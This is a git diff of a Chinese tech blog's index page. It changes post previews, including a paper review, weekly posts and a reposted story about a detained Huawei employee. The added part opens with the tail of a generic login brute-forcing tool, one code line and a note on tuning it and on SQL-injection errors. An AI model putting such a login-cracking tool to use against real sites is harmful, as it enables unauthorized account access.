+ <span class="string">" in login page: "</span> + url + <span class="string">'\n'</span>)</span><br><span class="line">                <span class="keyword">return</span> <span class="string">''</span>,<span class="string">''</span>,<span class="string">''</span></span><br></pre></td></tr></table></figure>
+<hr>
+<p>因为通用型爆破，可能无法做到百分百准确，可以修改配置文件来更符合你的需求。（出现sql错误信息可能存在post注入的情况无法进行爆破）二向箔安全 最近开放了一系列免费的网络安全技能包，通过学习技能不断提升自我能力，在网络安全的世界中不断闯关升级。</p>
+
+          
+        
+      
+    </div>
+
+    
+
+    
+    
+    
+
+    
+
+    
+      
+    
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  
+
+  <article class="post post-type-normal" itemscope="" itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://www.codewoody.com/posts/5934/">
+
+    <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="治部少辅">
+      <meta itemprop="description" content="晚来天雨雪，能饮一杯无？">
+      <meta itemprop="image" content="https://imgs.codewoody.com/uploads/big/0330eb8242d9bfc4873c11450f0ab691.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope="" itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="治部少辅">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h2 class="post-title" itemprop="name headline">
+                
+                
+                <a href="/posts/5934/" class="post-title-link" itemprop="url">Weekly-28</a>
+              
+            
+          </h2>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+
+            
+            
+            
+
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Posted on</span>
+              
+
+              
+                
+              
+
+              <time title="Created: 2019-12-30 12:52:05" itemprop="dateCreated datePublished" datetime="2019-12-30T12:52:05+08:00">2019-12-30</time>
+            
+
+            
+              
+
+              
+                
+                <span class="post-meta-divider">|</span>
+                
+
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-calendar-check-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">Edited on</span>
+                
+                <time title="Modified: 2020-01-08 10:53:46" itemprop="dateModified" datetime="2020-01-08T10:53:46+08:00">2020-01-08</time>
+              
+            
+          </span>
+
+          
+            <span class="post-category">
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">In</span>
+              
+              
+                <span itemprop="about" itemscope="" itemtype="http://schema.org/Thing"><a href="/categories/Weekly/" itemprop="url" rel="index"><span itemprop="name">Weekly</span></a></span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+            
+              
+              <span class="post-comments-count">
+                <span class="post-meta-divider">|</span>
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-comment-o"></i>
+                </span>
+            
+                <span class="post-meta-item-text">Comments: </span>
+                <a href="/posts/5934/#comments" itemprop="discussionUrl">
+                  <span class="post-comments-count disqus-comment-count" data-disqus-identifier="posts/5934/" itemprop="commentCount"></span>
+                </a>
+              </span>
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body han-init-context" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          <p><img src="https://imgs.codewoody.com/uploads/big/77513bce2484c6ab38127447a5093c02.jpg"></p>
+          <!--noindex-->
+          
+            <div class="post-button text-center">
+              <a class="btn" href="/posts/5934/#more" rel="contents">
+                Read more &raquo;
+              </a>
+            </div>
+          
+          <!--/noindex-->
+        
+      
+    </div>
+
+    
+
+    
+    
+    
+
+    
+
+    
+      
+    
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  
+
+  <article class="post post-type-normal" itemscope="" itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
     <link itemprop="mainEntityOfPage" href="http://www.codewoody.com/posts/4972/">
 
     <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
@@ -499,7 +1924,7 @@
                 
                   <span class="post-meta-item-text">Edited on</span>
                 
-                <time title="Modified: 2019-12-30 12:37:54" itemprop="dateModified" datetime="2019-12-30T12:37:54+08:00">2019-12-30</time>
+                <time title="Modified: 2020-01-13 13:03:20" itemprop="dateModified" datetime="2020-01-13T13:03:20+08:00">2020-01-13</time>
               
             
           </span>
@@ -1001,1295 +2426,11 @@
 
 
     
-      
-
-  
-
-  
-  
-  
-
-  
-
-  <article class="post post-type-normal" itemscope="" itemtype="http://schema.org/Article">
-  
-  
-  
-  <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://www.codewoody.com/posts/14647/">
-
-    <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="治部少辅">
-      <meta itemprop="description" content="晚来天雨雪，能饮一杯无？">
-      <meta itemprop="image" content="https://imgs.codewoody.com/uploads/big/0330eb8242d9bfc4873c11450f0ab691.jpg">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope="" itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="治部少辅">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h2 class="post-title" itemprop="name headline">
-                
-                
-                <a href="/posts/14647/" class="post-title-link" itemprop="url">[读论文]自动驾驶编队与LTE D2D通信</a>
-              
-            
-          </h2>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-
-            
-            
-            
-
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">Posted on</span>
-              
-
-              
-                
-              
-
-              <time title="Created: 2019-12-11 16:03:23" itemprop="dateCreated datePublished" datetime="2019-12-11T16:03:23+08:00">2019-12-11</time>
-            
-
-            
-              
-
-              
-                
-                <span class="post-meta-divider">|</span>
-                
-
-                <span class="post-meta-item-icon">
-                  <i class="fa fa-calendar-check-o"></i>
-                </span>
-                
-                  <span class="post-meta-item-text">Edited on</span>
-                
-                <time title="Modified: 2019-12-13 18:16:04" itemprop="dateModified" datetime="2019-12-13T18:16:04+08:00">2019-12-13</time>
-              
-            
-          </span>
-
-          
-            <span class="post-category">
-            
-              <span class="post-meta-divider">|</span>
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-folder-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">In</span>
-              
-              
-                <span itemprop="about" itemscope="" itemtype="http://schema.org/Thing"><a href="/categories/读论文/" itemprop="url" rel="index"><span itemprop="name">读论文</span></a></span>
-
-                
-                
-              
-            </span>
-          
-
-          
-            
-            
-              
-              <span class="post-comments-count">
-                <span class="post-meta-divider">|</span>
-                <span class="post-meta-item-icon">
-                  <i class="fa fa-comment-o"></i>
-                </span>
-            
-                <span class="post-meta-item-text">Comments: </span>
-                <a href="/posts/14647/#comments" itemprop="discussionUrl">
-                  <span class="post-comments-count disqus-comment-count" data-disqus-identifier="posts/14647/" itemprop="commentCount"></span>
-                </a>
-              </span>
-            
-          
-
-          
-          
-
-          
-
-          
-
-          
-
-        </div>
-      </header>
-    
-
-    
-    
-    
-    <div class="post-body han-init-context" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          <p>这里选择的文章是 2017 年的文章 <a href="https://ieeexplore.ieee.org/document/7829297" target="_blank" rel="noopener">Better Platooning Control Toward Autonomous Driving: An LTE Device-To-Device Communications Strategy That Meets Ultralow Latency Requirements</a>。文章来自 <a href="http://www.ieeevtc.org/vtmagazine/" target="_blank" rel="noopener">Vehicular Technology Magazine</a> 杂志。这个杂志的影响因子挺高的。从标题来看，作者关注的是 LTE D2D 通信无人驾驶编队的控制问题中的应用。D2D 通信是 5G 引入的一个非常重要的特性。可以说对于物联网应用来说，D2D 能力比起带宽和延时来说更为重要。不过舆论对于这个问题的关注不多。这篇文章是一篇 Magazine，一般 Magazine 文章关注的都是研究趋势，而不是关注特别细节的技术问题。因此仔细阅读这篇文章，可以帮助我们了解车联网 + 5G 研究的一些前沿的思路，而不用陷入很多繁冗的细节问题。</p>
-<blockquote>
-<p>看完了文章可以来做一些评论了。最初看这篇文章的目的有两方面，首先是我准备投稿 VTM，因此找来上面的文章看看其风格，而具体而言选择这篇文章，是因为这篇文章涉及的无人驾驶编队问题和 5G D2D 技术都是我比较关心的。</p>
-<p>从文章风格来看，这篇 VTM 还是比较典型的 Magazine 文章风格：即篇幅不长，图片比较多，而几乎没有公式。文章的会有比较大段、详细的研究背景阐述。其提出的协议和机制内容不会特别复杂，也比较少和其他文章的协议进行对比。总结而言，这类文章是选择一个比较新的研究背景，在充分介绍背景问题的基础上，提出一些非常简单的机制，具有 Tutorial 的性质。</p>
-<p>就这篇文章的内容来说，其提出的通信架构其实是非常简单的，模型也非常简单。可见，要写这类 Magazine 文章，提出什么精巧详尽的协议并不是最重要的。最重要的还是要找到非常好的研究场景。</p>
-</blockquote>
-          <!--noindex-->
-          
-            <div class="post-button text-center">
-              <a class="btn" href="/posts/14647/#more" rel="contents">
-                Read more &raquo;
-              </a>
-            </div>
-          
-          <!--/noindex-->
-        
-      
-    </div>
-
-    
-
-    
-    
-    
-
-    
-
-    
-      
-    
-    
-
-    
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </div>
-  
-  
-  
-  </article>
-
-
-    
-      
-
-  
-
-  
-  
-  
-
-  
-
-  <article class="post post-type-normal" itemscope="" itemtype="http://schema.org/Article">
-  
-  
-  
-  <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://www.codewoody.com/posts/53997/">
-
-    <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="治部少辅">
-      <meta itemprop="description" content="晚来天雨雪，能饮一杯无？">
-      <meta itemprop="image" content="https://imgs.codewoody.com/uploads/big/0330eb8242d9bfc4873c11450f0ab691.jpg">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope="" itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="治部少辅">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h2 class="post-title" itemprop="name headline">
-                
-                
-                <a href="/posts/53997/" class="post-title-link" itemprop="url">Weekly-25</a>
-              
-            
-          </h2>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-
-            
-            
-            
-
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">Posted on</span>
-              
-
-              
-                
-              
-
-              <time title="Created: 2019-12-09 16:44:07" itemprop="dateCreated datePublished" datetime="2019-12-09T16:44:07+08:00">2019-12-09</time>
-            
-
-            
-              
-
-              
-                
-                <span class="post-meta-divider">|</span>
-                
-
-                <span class="post-meta-item-icon">
-                  <i class="fa fa-calendar-check-o"></i>
-                </span>
-                
-                  <span class="post-meta-item-text">Edited on</span>
-                
-                <time title="Modified: 2019-12-16 13:39:52" itemprop="dateModified" datetime="2019-12-16T13:39:52+08:00">2019-12-16</time>
-              
-            
-          </span>
-
-          
-            <span class="post-category">
-            
-              <span class="post-meta-divider">|</span>
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-folder-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">In</span>
-              
-              
-                <span itemprop="about" itemscope="" itemtype="http://schema.org/Thing"><a href="/categories/Weekly/" itemprop="url" rel="index"><span itemprop="name">Weekly</span></a></span>
-
-                
-                
-              
-            </span>
-          
-
-          
-            
-            
-              
-              <span class="post-comments-count">
-                <span class="post-meta-divider">|</span>
-                <span class="post-meta-item-icon">
-                  <i class="fa fa-comment-o"></i>
-                </span>
-            
-                <span class="post-meta-item-text">Comments: </span>
-                <a href="/posts/53997/#comments" itemprop="discussionUrl">
-                  <span class="post-comments-count disqus-comment-count" data-disqus-identifier="posts/53997/" itemprop="commentCount"></span>
-                </a>
-              </span>
-            
-          
-
-          
-          
-
-          
-
-          
-
-          
-
-        </div>
-      </header>
-    
-
-    
-    
-    
-    <div class="post-body han-init-context" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          <p><img src="https://imgs.codewoody.com/uploads/big/8a010830e663bf6758614846d0920736.jpg"></p>
-          <!--noindex-->
-          
-            <div class="post-button text-center">
-              <a class="btn" href="/posts/53997/#more" rel="contents">
-                Read more &raquo;
-              </a>
-            </div>
-          
-          <!--/noindex-->
-        
-      
-    </div>
-
-    
-
-    
-    
-    
-
-    
-
-    
-      
-    
-    
-
-    
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </div>
-  
-  
-  
-  </article>
-
-
-    
-      
-
-  
-
-  
-  
-  
-
-  
-
-  <article class="post post-type-normal" itemscope="" itemtype="http://schema.org/Article">
-  
-  
-  
-  <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://www.codewoody.com/posts/27790/">
-
-    <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="治部少辅">
-      <meta itemprop="description" content="晚来天雨雪，能饮一杯无？">
-      <meta itemprop="image" content="https://imgs.codewoody.com/uploads/big/0330eb8242d9bfc4873c11450f0ab691.jpg">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope="" itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="治部少辅">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h2 class="post-title" itemprop="name headline">
-                
-                
-                <a href="/posts/27790/" class="post-title-link" itemprop="url">[翻译]网页中的图像优化指南</a>
-              
-            
-          </h2>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-
-            
-            
-            
-
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">Posted on</span>
-              
-
-              
-                
-              
-
-              <time title="Created: 2019-12-04 03:07:43 / Modified: 21:25:27" itemprop="dateCreated datePublished" datetime="2019-12-04T03:07:43+08:00">2019-12-04</time>
-            
-
-            
-              
-
-              
-            
-          </span>
-
-          
-
-          
-            
-            
-              
-              <span class="post-comments-count">
-                <span class="post-meta-divider">|</span>
-                <span class="post-meta-item-icon">
-                  <i class="fa fa-comment-o"></i>
-                </span>
-            
-                <span class="post-meta-item-text">Comments: </span>
-                <a href="/posts/27790/#comments" itemprop="discussionUrl">
-                  <span class="post-comments-count disqus-comment-count" data-disqus-identifier="posts/27790/" itemprop="commentCount"></span>
-                </a>
-              </span>
-            
-          
-
-          
-          
-
-          
-
-          
-
-          
-
-        </div>
-      </header>
-    
-
-    
-    
-    
-    <div class="post-body han-init-context" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          <p>本文翻译自<a href="https://dev.to/prototyp/optimizing-images-for-the-web-an-in-depth-guide-4j7d" target="_blank" rel="noopener">Optimizing images for the web - an in-depth guide</a></p>
-<p><img src="https://imgs.codewoody.com/uploads/big/11095b11da720ac41968ed26b81beb9d.jpg"></p>
-<p>这篇文章提供了Web开发中涉及图像的一些优化问题：</p>
-          <!--noindex-->
-          
-            <div class="post-button text-center">
-              <a class="btn" href="/posts/27790/#more" rel="contents">
-                Read more &raquo;
-              </a>
-            </div>
-          
-          <!--/noindex-->
-        
-      
-    </div>
-
-    
-
-    
-    
-    
-
-    
-
-    
-      
-    
-    
-
-    
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </div>
-  
-  
-  
-  </article>
-
-
-    
-      
-
-  
-
-  
-  
-  
-
-  
-
-  <article class="post post-type-normal" itemscope="" itemtype="http://schema.org/Article">
-  
-  
-  
-  <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://www.codewoody.com/posts/4652/">
-
-    <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="治部少辅">
-      <meta itemprop="description" content="晚来天雨雪，能饮一杯无？">
-      <meta itemprop="image" content="https://imgs.codewoody.com/uploads/big/0330eb8242d9bfc4873c11450f0ab691.jpg">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope="" itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="治部少辅">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h2 class="post-title" itemprop="name headline">
-                
-                
-                <a href="/posts/4652/" class="post-title-link" itemprop="url">Weekly-24</a>
-              
-            
-          </h2>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-
-            
-            
-            
-
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">Posted on</span>
-              
-
-              
-                
-              
-
-              <time title="Created: 2019-12-02 12:28:48" itemprop="dateCreated datePublished" datetime="2019-12-02T12:28:48+08:00">2019-12-02</time>
-            
-
-            
-              
-
-              
-                
-                <span class="post-meta-divider">|</span>
-                
-
-                <span class="post-meta-item-icon">
-                  <i class="fa fa-calendar-check-o"></i>
-                </span>
-                
-                  <span class="post-meta-item-text">Edited on</span>
-                
-                <time title="Modified: 2019-12-13 16:15:38" itemprop="dateModified" datetime="2019-12-13T16:15:38+08:00">2019-12-13</time>
-              
-            
-          </span>
-
-          
-            <span class="post-category">
-            
-              <span class="post-meta-divider">|</span>
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-folder-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">In</span>
-              
-              
-                <span itemprop="about" itemscope="" itemtype="http://schema.org/Thing"><a href="/categories/Weekly/" itemprop="url" rel="index"><span itemprop="name">Weekly</span></a></span>
-
-                
-                
-              
-            </span>
-          
-
-          
-            
-            
-              
-              <span class="post-comments-count">
-                <span class="post-meta-divider">|</span>
-                <span class="post-meta-item-icon">
-                  <i class="fa fa-comment-o"></i>
-                </span>
-            
-                <span class="post-meta-item-text">Comments: </span>
-                <a href="/posts/4652/#comments" itemprop="discussionUrl">
-                  <span class="post-comments-count disqus-comment-count" data-disqus-identifier="posts/4652/" itemprop="commentCount"></span>
-                </a>
-              </span>
-            
-          
-
-          
-          
-
-          
-
-          
-
-          
-
-        </div>
-      </header>
-    
-
-    
-    
-    
-    <div class="post-body han-init-context" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          <p><img src="https://imgs.codewoody.com/uploads/big/57ff1d652828123817e2eba8b6061242.jpg"></p>
-          <!--noindex-->
-          
-            <div class="post-button text-center">
-              <a class="btn" href="/posts/4652/#more" rel="contents">
-                Read more &raquo;
-              </a>
-            </div>
-          
-          <!--/noindex-->
-        
-      
-    </div>
-
-    
-
-    
-    
-    
-
-    
-
-    
-      
-    
-    
-
-    
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </div>
-  
-  
-  
-  </article>
-
-
-    
-      
-
-  
-
-  
-  
-  
-
-  
-
-  <article class="post post-type-normal" itemscope="" itemtype="http://schema.org/Article">
-  
-  
-  
-  <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://www.codewoody.com/posts/62057/">
-
-    <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="治部少辅">
-      <meta itemprop="description" content="晚来天雨雪，能饮一杯无？">
-      <meta itemprop="image" content="https://imgs.codewoody.com/uploads/big/0330eb8242d9bfc4873c11450f0ab691.jpg">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope="" itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="治部少辅">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h2 class="post-title" itemprop="name headline">
-                
-                
-                <a href="/posts/62057/" class="post-title-link" itemprop="url">高技术人才长期羁押问题</a>
-              
-            
-          </h2>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-
-            
-            
-            
-
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">Posted on</span>
-              
-
-              
-                
-              
-
-              <time title="Created: 2019-12-01 14:04:11" itemprop="dateCreated datePublished" datetime="2019-12-01T14:04:11+08:00">2019-12-01</time>
-            
-
-            
-              
-
-              
-                
-                <span class="post-meta-divider">|</span>
-                
-
-                <span class="post-meta-item-icon">
-                  <i class="fa fa-calendar-check-o"></i>
-                </span>
-                
-                  <span class="post-meta-item-text">Edited on</span>
-                
-                <time title="Modified: 2019-12-02 12:50:50" itemprop="dateModified" datetime="2019-12-02T12:50:50+08:00">2019-12-02</time>
-              
-            
-          </span>
-
-          
-            <span class="post-category">
-            
-              <span class="post-meta-divider">|</span>
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-folder-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">In</span>
-              
-              
-                <span itemprop="about" itemscope="" itemtype="http://schema.org/Thing"><a href="/categories/杂谈/" itemprop="url" rel="index"><span itemprop="name">杂谈</span></a></span>
-
-                
-                
-              
-            </span>
-          
-
-          
-            
-            
-              
-              <span class="post-comments-count">
-                <span class="post-meta-divider">|</span>
-                <span class="post-meta-item-icon">
-                  <i class="fa fa-comment-o"></i>
-                </span>
-            
-                <span class="post-meta-item-text">Comments: </span>
-                <a href="/posts/62057/#comments" itemprop="discussionUrl">
-                  <span class="post-comments-count disqus-comment-count" data-disqus-identifier="posts/62057/" itemprop="commentCount"></span>
-                </a>
-              </span>
-            
-          
-
-          
-          
-
-          
-
-          
-
-          
-
-        </div>
-      </header>
-    
-
-    
-    
-    
-    <div class="post-body han-init-context" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          <p>近期华为一位工程师在获取离职赔偿之后被公司诬告，导致他被羁押了251天的事情再次带来了社会舆论对于技术人才遭遇的这种司法不公的关注。似乎在这种问题上，我国的取保候审制度似乎就成了摆设。</p>
-          <!--noindex-->
-          
-            <div class="post-button text-center">
-              <a class="btn" href="/posts/62057/#more" rel="contents">
-                Read more &raquo;
-              </a>
-            </div>
-          
-          <!--/noindex-->
-        
-      
-    </div>
-
-    
-
-    
-    
-    
-
-    
-
-    
-      
-    
-    
-
-    
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </div>
-  
-  
-  
-  </article>
-
-
-    
-      
-
-  
-
-  
-  
-  
-
-  
-
-  <article class="post post-type-normal" itemscope="" itemtype="http://schema.org/Article">
-  
-  
-  
-  <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://www.codewoody.com/posts/38296/">
-
-    <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="治部少辅">
-      <meta itemprop="description" content="晚来天雨雪，能饮一杯无？">
-      <meta itemprop="image" content="https://imgs.codewoody.com/uploads/big/0330eb8242d9bfc4873c11450f0ab691.jpg">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope="" itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="治部少辅">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h2 class="post-title" itemprop="name headline">
-                
-                
-                <a href="/posts/38296/" class="post-title-link" itemprop="url">[转载]传华为13年老员工离职索要赔偿被关押251天</a>
-              
-            
-          </h2>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-
-            
-            
-            
-
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">Posted on</span>
-              
-
-              
-                
-              
-
-              <time title="Created: 2019-11-30 19:37:18 / Modified: 19:38:51" itemprop="dateCreated datePublished" datetime="2019-11-30T19:37:18+08:00">2019-11-30</time>
-            
-
-            
-              
-
-              
-            
-          </span>
-
-          
-
-          
-            
-            
-              
-              <span class="post-comments-count">
-                <span class="post-meta-divider">|</span>
-                <span class="post-meta-item-icon">
-                  <i class="fa fa-comment-o"></i>
-                </span>
-            
-                <span class="post-meta-item-text">Comments: </span>
-                <a href="/posts/38296/#comments" itemprop="discussionUrl">
-                  <span class="post-comments-count disqus-comment-count" data-disqus-identifier="posts/38296/" itemprop="commentCount"></span>
-                </a>
-              </span>
-            
-          
-
-          
-          
-
-          
-
-          
-
-          
-
-        </div>
-      </header>
-    
-
-    
-    
-    
-    <div class="post-body han-init-context" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          
-            <blockquote>
-<p>原文转载自：<a href="https://www.williamlong.info/archives/5902.html" target="_blank" rel="noopener">https://www.williamlong.info/archives/5902.html</a></p>
-</blockquote>
-<p>11月28日一份刑事赔偿决定书在网上流传，一位华为离职员工李洪元索要2N赔偿之后，被华为控告敲诈勒索，于2018年12月16日被拘留，法院认定犯罪事实不清，证据不足，不符合起诉条件，关押251天后李洪元重回自由。</p>
-<p>在法院的宣判文中，深圳龙岗法院表示：深圳市公安局移送审查起诉的犯罪嫌疑人李洪元涉嫌敲诈勒索罪一案退回公安机关第二次补充侦查。深圳市公安局于7月10日提交了《补充侦查报告》，反映了其在与李洪元商谈离职补偿问题时，李洪元根本不存在敲诈勒索的行为。为此，鉴于李洪元的行为根本不构成犯罪或者依法不应追究刑事责任的实际情况，依照《刑事诉讼法》第一百七十三条第一款及第一百七十一条第四款之规定，对华为该员工作出法定不起诉的决定。</p>
-<p>经本院审查并通过补充侦查，仍然认为深圳市公安局认定的犯罪事实不清，证据不足，不符合起诉条件。于2019年8月22日决定对李洪元不起诉。对赔偿请求人李洪元予以国家赔偿，包括人身自由损害赔偿金79300.94元，精神损害抚慰金27755元，两项合计107522. 94元。向李洪元原工作单位、其父亲李洪元所在的工作单位发函、为其消除影响、恢复名誉。</p>
-<p>从宣判文中可见：</p>
-<ol type="1">
-<li>李洪元2005年入职华为担任工程师，离职前在逆变器销售管理部工作，2018年1月31日离职，在华为工作13年之久，主动离职与辞退离职尚未知晓。</li>
-<li>离职过程中，因为补偿金额发生争议，商议后补偿33万元左右。</li>
-<li>2018年3月8日，李洪元离职近40天后，华为向其转款补偿金，注意是通过私人账号，同时备注转款原因离职经济补偿。</li>
-</ol>
-<p>前边的一系列流程都很正常，离职然后补偿，但华为的HR并没有停手，他们起诉李洪元敲诈勒索，于2018年12月16日被拘留，幸亏人民法院认定犯罪事实不清，证据不足，认定不符合起诉条件，关押251天后李洪元重回自由。</p>
-<p>以下为不起诉意向书（部分）内容：</p>
-<p>2018年12月15日，华为公司委托法务人员袁x到深圳市公安局经侦支队八大队报案称：公司员工李xx与杨x等人勾结，在与公司的离职补偿劳动纠纷中，威胁将资料外泄披露，要求公司给予补偿。在公安机关以侵犯商业秘密立案而查证无果的情况下，华为公司改变策略，于2018年12月28日以涉嫌敲诈勒索再次报案，控告李xx于2018年1月31日与部门领导何xx洽谈离职补偿过程中，采用威胁和强制的方式，迫使该员工何xx同意私下给付额外补偿金33万元，以换取他不闹事，不举报，顺利离职的承诺。</p>
-<p>本案中，华为公司相关工作人员何xx、李x、袁x、周x作为证人，分别多次接受了公安机关的询问，并制作了询问笔录。所有这些证人均口径一致的指证李xx在与何xx商谈离职补偿时，采用了威胁和强制的方式，逼迫何xx给予额外的2N补偿，最后何xx考虑到李xx的危险性，不得不作出让步。好在该员工李xx保存了当时与何xx商谈离职补偿时的录音资料，通过该录音资料能够反证何xx等人是在说谎，不能排除有恶意构陷李xx之嫌。辩护人觉得事态严重，迅速向贵院出具了法律意见书，要求人民检察院将本案退回补充侦查。</p>
-<p>公安机关在第一次补充侦查阶段，提交了将查扣的李xx的两部手机、一台笔记本电脑、一个录音笔、一个u盘、一个移动硬盘设备内的电子数据委托广东安证计算机司法鉴定所进行司法鉴定后，该所出具的《司法鉴定意见书》及录音资料文字版。能够证明当时的商谈是在双方有说有笑的基础上进行的，最终经过2小时12分24秒的充分协商，达成了离职补偿协议，整个过程并无李xx实施威胁或要挟的语言，反倒是何xx与袁x反复强调该协议内容合法，要求该员工李xx尽快接受协议约定的内容并迅速签字，足以证明李xx在与何xx商谈离职补偿的时候没有采用敲诈勒索的方式，何xx等人的证言称何xx在与李xx商谈离职补偿时受到李洪元敲诈勒索没有事实根据。</p>
-<p>公安机关在第二次补充侦查过程中，再一次对何xx进行了询问，并附上了对何xx的询问笔录。可能这次是何xx良心发现，推翻了原来的证言，并如实陈述了自己与李xx仅仅只是2018年1月31日下午接触过一次，且在这次商谈过程中，李xx并没有对其实施要挟和威胁行为。该陈述与公安机关第一次补充侦查阶段提供的2019年5月13日华为公司逆变器管理部HRBP吕辉平出具的《关于李xx工作调整和合同不续签的两次正式沟通说明》内容相印证。吕xx在说明中称，自己协助主管熊x与该员工进行了两次沟通，第一次是在2017年7月底指出该员工业务不足以及工作调整，下半年工作重点和输出等，并提供机会给他工作调整；第二次是2017年12月份，作出不续签合同的正式沟通，安排工作交接和要求，整个沟通过程平和，李表示了解公司离职政策，并没有跟沟通主管和吕xx提特殊要求。由此可见，李xx在2018年1月31日与何xx商谈离职补偿之前，没有采用任何过激的语言，当获知公司不续签劳动合同的消息后，也能够保持理智，并没有提出任何特殊要求；接着在与何xx商谈离职补偿的过程中，更没有对何xx实施要挟和威胁的方式。那么，本案所谓敲诈勒索罪依法不能成立。</p>
-
-          
-        
-      
-    </div>
-
-    
-
-    
-    
-    
-
-    
-
-    
-      
-    
-    
-
-    
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </div>
-  
-  
-  
-  </article>
-
-
-    
-      
-
-  
-
-  
-  
-  
-
-  
-
